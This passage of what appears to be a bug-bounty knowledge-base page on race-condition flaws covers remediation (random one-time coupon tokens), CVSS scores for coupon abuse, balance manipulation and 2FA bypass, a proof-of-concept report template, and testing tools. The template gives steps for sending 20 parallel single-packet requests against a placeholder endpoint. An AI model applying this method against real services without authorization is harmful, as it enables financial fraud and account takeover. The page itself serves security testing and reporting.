+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>        <span class="n">process_withdrawal</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="5-cryptographic-tokens">5. Cryptographic Tokens<a class="headerlink" href="#5-cryptographic-tokens" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># Use unpredictable, one-time tokens</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">generate_coupon</span><span class="p">():</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>    <span class="k">return</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>  <span class="c1"># Can&#39;t be predicted/reused</span>
+</span></code></pre></div>
+<hr />
+<h2 id="impact-scoring">Impact Scoring<a class="headerlink" href="#impact-scoring" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Impact</th>
+<th>CVSS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Rate limit bypass (login)</td>
+<td>Medium</td>
+<td>5.3</td>
+</tr>
+<tr>
+<td>Coupon/discount abuse</td>
+<td>Medium-High</td>
+<td>6.5</td>
+</tr>
+<tr>
+<td>Balance manipulation</td>
+<td>High</td>
+<td>8.1</td>
+</tr>
+<tr>
+<td>2FA bypass</td>
+<td>High</td>
+<td>8.1</td>
+</tr>
+<tr>
+<td>Account takeover via state confusion</td>
+<td>Critical</td>
+<td>9.8</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="poc-report-template">PoC Report Template<a class="headerlink" href="#poc-report-template" title="Permanent link">&para;</a></h2>
+<div class="language-markdown highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="gu">## Summary</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Race condition in [endpoint] allows [impact] by sending concurrent requests.
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="gu">## Vulnerability Type</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>TOCTOU (Time-of-Check to Time-of-Use) / Race Condition
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="gu">## Steps to Reproduce</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="k">1.</span> Configure Burp Suite with Turbo Intruder
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="k">2.</span> Create request to [endpoint]
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="k">3.</span> Send 20 parallel requests using single-packet attack
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a><span class="k">4.</span> Observe [unexpected behavior]
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="gu">## Request</span>
+</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>POST /endpoint HTTP/2
+</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>Host: target.com
+</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>[headers]
+</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>
+</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>[body]
+</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a>
+</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="gu">## Impact</span>
+</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>[Describe business impact - financial loss, unauthorized access, etc.]
+</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>
+</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a><span class="gu">## Remediation</span>
+</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a><span class="k">-</span><span class="w"> </span>Implement database-level locking
+</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a><span class="k">-</span><span class="w"> </span>Use idempotency keys for sensitive operations
+</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a><span class="k">-</span><span class="w"> </span>Atomic database operations
+</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>
+</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a><span class="gu">## References</span>
+</span><span id="__span-32-29"><a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a><span class="k">-</span><span class="w"> </span>https://portswigger.net/research/smashing-the-state-machine
+</span></code></pre></div>
+<hr />
+<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Burp Suite Repeater</strong></td>
+<td>Quick parallel group sending</td>
+</tr>
+<tr>
+<td><strong>Turbo Intruder</strong></td>
+<td>Complex race scripts, HTTP/2</td>
+</tr>
+<tr>
+<td><strong>h2spacex</strong></td>
+<td>Python HTTP/2 single-packet</td>
+</tr>
+<tr>
+<td><strong>httpx</strong></td>
+<td>Python async HTTP/2 client</td>
+</tr>
+<tr>
+<td><strong>Wireshark</strong></td>
+<td>Verify single-packet delivery</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<p><em>Research credit: James Kettle (PortSwigger) — "Smashing the State Machine" Black Hat USA 2023</em></p>
+<p><em>Related: <a href="../oauth-to-ato/">OAuth to ATO</a> | <a href="../xss-to-ato/">XSS to ATO</a></em></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.prune", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": {"client-side": "client-side", "critical": "critical", "high": "high", "infra": "infra", "logic": "logic", "low": "low", "medium": "medium", "server-side": "server-side"}, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
